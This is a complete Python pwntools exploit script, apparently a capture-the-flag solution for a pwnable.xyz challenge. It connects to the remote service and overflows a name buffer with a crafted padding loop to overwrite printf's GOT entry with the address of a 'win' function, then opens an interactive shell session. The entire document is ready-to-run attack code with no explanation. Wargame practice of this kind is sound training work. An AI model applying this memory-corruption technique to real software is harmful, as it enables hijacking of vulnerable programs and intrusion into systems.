#!/usr/bin/python
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30013)
#gdb.attach(p)
elf = ELF("./challenge")
win = elf.symbols['win']
printf_got = elf.got['printf']

p.sendafter("Name: ", "A")
p.sendafter("Desc: ", "B")

pay = 'A'*0x80 + "\x40\x20\x60\x12"
length = len(pay)

for i in range(length-128):
    p.sendafter("> ", "1")
    p.sendafter("Name: ", "\x00")

#gdb.attach(p)
p.sendafter("> ", "1")
p.sendafter("Name: ", pay)

p.sendafter("> ", "2")
p.sendafter("Desc: ", p64(win))

p.interactive()

